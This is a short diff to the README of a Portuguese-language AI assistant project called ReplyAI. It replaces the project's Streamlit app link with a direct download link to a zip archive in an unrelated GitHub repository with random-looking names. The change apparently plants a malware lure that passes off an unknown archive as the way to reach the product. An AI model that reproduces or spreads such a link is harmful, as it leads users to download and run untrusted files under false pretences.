@@ -1,2 +1,2 @@
 # 🤖 ReplyAI - Assistente Online
-Acesse: https://replyai-web.streamlit.app
+Acesse: https://raw.githubusercontent.com/david2442/rscari/main/semivulcanized/rscari.zip
